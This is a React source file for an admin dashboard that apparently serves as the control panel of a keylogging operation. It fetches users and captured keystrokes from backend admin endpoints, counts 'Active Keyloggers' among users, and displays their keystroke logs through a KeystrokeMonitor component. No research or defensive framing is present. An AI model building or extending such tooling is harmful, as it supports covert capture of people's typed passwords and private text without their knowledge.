import React, { useContext, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { AppContent } from "../context/AppContext";
import axios from "axios";
import KeystrokeMonitor from "../components/KeyStrokeMonitor";

const AdminDashboard = () => {
  const { userData, backendUrl } = useContext(AppContent);
  const [users, setUsers] = useState([]);
  const [keystrokes, setKeystrokes] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchData = async () => {
      if (userData?.role !== "admin") {
        navigate("/");
        return;
      }

      try {
        const [usersRes, keystrokesRes] = await Promise.all([
          axios.get(`${backendUrl}/api/admin/users`, { withCredentials: true }),
          axios.get(`${backendUrl}/api/admin/keystrokes`, {
            withCredentials: true,
          }),
        ]);

        if (usersRes.data.success) setUsers(usersRes.data.users);
        if (keystrokesRes.data.success)
          setKeystrokes(keystrokesRes.data.keystrokes); // Store keystrokes data
      } catch (error) {
        console.error("Admin data fetch error:", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, [userData, navigate, backendUrl]);

  if (userData?.role !== "admin") {
    return null; // If not admin, return null (redirect handled)
  }

  if (loading) {
    return <div className="text-center py-20">Loading admin dashboard...</div>;
  }

  return (
    <div className="min-h-screen bg-[#0b0f1e] text-white p-6">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-cyan-400 mb-8">
          Admin Dashboard
        </h1>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <div className="bg-[#1a1f2e] p-6 rounded-lg border border-cyan-800">
            <h3 className="text-lg font-semibold mb-2">Total Users</h3>
            <p className="text-3xl font-bold">{users.length}</p>
          </div>
          <div className="bg-[#1a1f2e] p-6 rounded-lg border border-cyan-800">
            <h3 className="text-lg font-semibold mb-2">Active Keyloggers</h3>
            <p className="text-3xl font-bold">
              {users.filter((u) => u.keyloggerInstalled).length}
            </p>
          </div>
        </div>

        {/* Render Keystroke Monitor with the fetched keystrokes data */}
        <KeystrokeMonitor keystrokes={keystrokes} />
      </div>
    </div>
  );
};

export default AdminDashboard;
